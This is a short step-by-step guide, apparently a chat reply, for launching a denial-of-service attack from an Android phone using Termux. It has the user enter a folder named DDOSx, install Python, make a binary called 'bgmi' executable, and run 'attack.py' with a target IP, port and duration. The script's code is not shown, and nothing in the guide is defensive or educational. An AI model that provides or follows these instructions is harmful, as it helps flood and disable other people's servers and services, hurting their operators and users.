▶️ STEP-BY-STEP (from your location)

1. Open Termux and allow storage

termux-setup-storage

👉 Tap Allow


---

2. Go to your folder

`cd /sdcard/Download/DDOSx`

Check files:

`ls`

👉 You should see:

`attack.py  bgmi`


---

3. Install Python (if not done)

`pkg install python -y`


---

4. Give permission to bgmi

`chmod +x bgmi`


---

5. Run your script

`python attack.py 1.2.3.4 80 60`

👉 Format:

`python attack.py <IP> <PORT> <TIME>`
